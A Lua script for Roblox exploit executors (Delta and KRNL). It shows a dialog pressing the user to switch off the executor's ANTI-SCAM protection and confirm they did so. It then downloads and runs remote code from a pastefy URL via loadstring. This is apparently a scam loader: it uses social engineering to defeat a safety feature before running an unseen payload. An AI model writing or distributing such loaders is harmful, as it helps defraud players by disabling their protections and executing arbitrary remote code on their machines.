--// Detect Executor
local executor = identifyexecutor and identifyexecutor():lower() or "unknown"
if executor ~= "delta" and executor ~= "krnl" then return end

--// Roblox Services
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

--// GUI Setup
local screenGui = Instance.new("ScreenGui", PlayerGui)
screenGui.Name = "AntiScamPrompt"
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

-- Main Frame
local frame = Instance.new("Frame", screenGui)
frame.Size = UDim2.new(0, 370, 0, 240)
frame.Position = UDim2.new(0.5, -185, 0.5, -120)
frame.BackgroundColor3 = Color3.fromRGB(223, 247, 221)
frame.BorderSizePixel = 0

-- Header Frame
local header = Instance.new("Frame", frame)
header.Size = UDim2.new(1, 0, 0, 50)
header.BackgroundColor3 = Color3.fromRGB(192, 235, 180)

-- Header Text
local headerText = Instance.new("TextLabel", header)
headerText.Size = UDim2.new(1, 0, 1, 0)
headerText.Position = UDim2.new(0, 0, 0, 0)
headerText.BackgroundTransparency = 1
headerText.Text = executor == "krnl" and "FOR KRNL USERS" or "FOR DELTA USERS"
headerText.TextColor3 = Color3.fromRGB(34, 80, 34)
headerText.Font = Enum.Font.GothamBold
headerText.TextSize = 20
headerText.TextXAlignment = Enum.TextXAlignment.Center

-- Instruction Label
local desc = Instance.new("TextLabel", frame)
desc.Position = UDim2.new(0, 0, 0, 60)
desc.Size = UDim2.new(1, 0, 0, 40)
desc.BackgroundTransparency = 1
desc.TextWrapped = true
desc.Text = executor == "krnl"
    and "Disable ANTI-SCAM in KRNL settings to ensure proper code functionality"
    or "Disable ANTI-SCAM in Delta settings to ensure proper code functionality"
desc.TextColor3 = Color3.fromRGB(60, 60, 60)
desc.Font = Enum.Font.Gotham
desc.TextSize = 14

-- Checkbox
local checkbox = Instance.new("TextButton", frame)
checkbox.Position = UDim2.new(0, 20, 0, 120)
checkbox.Size = UDim2.new(0, 24, 0, 24)
checkbox.Text = ""
checkbox.BackgroundColor3 = Color3.fromRGB(240, 255, 240)
checkbox.BorderColor3 = Color3.fromRGB(170, 220, 170)

local checked = false
checkbox.MouseButton1Click:Connect(function()
    checked = not checked
    checkbox.Text = checked and "âœ“" or ""
end)

-- Checkbox Label
local label = Instance.new("TextLabel", frame)
label.Position = UDim2.new(0, 50, 0, 120)
label.Size = UDim2.new(1, -50, 0, 24)
label.BackgroundTransparency = 1
label.Text = "I already disabled ANTI SCAM"
label.TextColor3 = Color3.fromRGB(60, 60, 60)
label.Font = Enum.Font.Gotham
label.TextSize = 14
label.TextXAlignment = Enum.TextXAlignment.Left

-- Proceed Button
local proceed = Instance.new("TextButton", frame)
proceed.Position = UDim2.new(0.5, -75, 1, -60)
proceed.Size = UDim2.new(0, 150, 0, 40)
proceed.BackgroundColor3 = Color3.fromRGB(120, 180, 120)
proceed.Text = "PROCEED"
proceed.TextColor3 = Color3.fromRGB(255, 255, 255)
proceed.Font = Enum.Font.GothamBold
proceed.TextSize = 16

-- Proceed Logic
proceed.MouseButton1Click:Connect(function()
    if not checked then
        proceed.Text = "Please check box"
        wait(1)
        proceed.Text = "PROCEED"
        return
    end

    screenGui:Destroy()

    --// ðŸ”¥ Actual Script Starts
    loadstring(game:HttpGet("https://pastefy.app/vH8EsPvd/raw"))()
end)
